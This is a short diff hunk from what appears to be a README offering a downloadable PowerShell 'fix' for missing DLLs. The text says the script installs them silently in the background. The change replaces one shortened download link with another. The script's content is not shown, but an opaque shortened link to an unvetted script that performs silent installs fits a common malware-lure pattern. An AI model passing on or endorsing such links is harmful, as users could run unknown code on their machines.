@@ -55,7 +55,7 @@ Silently install them in the background using:
 
 Prompt you to restart your PC once the fix is complete.
 
-📥 [Download Fix‐MissingDLLs.ps1](https://bit.ly/msvcp140dllmissing)
+📥 [Download Fix‐MissingDLLs.ps1](https://linkly.link/2KJul)
 
 
 
